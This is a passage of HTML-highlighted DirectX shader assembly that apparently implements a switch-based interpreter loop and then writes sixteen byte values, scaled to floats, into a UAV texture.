</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>case</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>7</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>15</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>z</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>case</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>8</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ult</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>y</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>case</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>9</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>128</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=o>-</span><span class=n>256</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>movc</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>y</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ilt</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>y</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ige</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>y</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>or</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>movc</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>xw</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>wwww</span><span class=p>,</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>xxxz</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>yyyz</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>movc</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>xz</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yyyy</span><span class=p>,</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>xxwx</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>xxzx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>default</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>z</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=o>-</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>endswitch</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>iadd</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>z</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>z</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>endloop</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>y</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>z</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>2</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>3</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>4</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>y</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>5</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>z</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>6</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>7</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>8</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>y</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>9</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>z</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>10</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>11</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>12</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>y</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>13</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>z</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>14</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>15</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>y</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>z</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>2</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>3</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>4</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>y</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>5</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>z</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>6</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>7</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>store_uav_typed</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>8</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>utof</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>y</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>.</span><span class=na>003921569</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>)</span><span class=w>
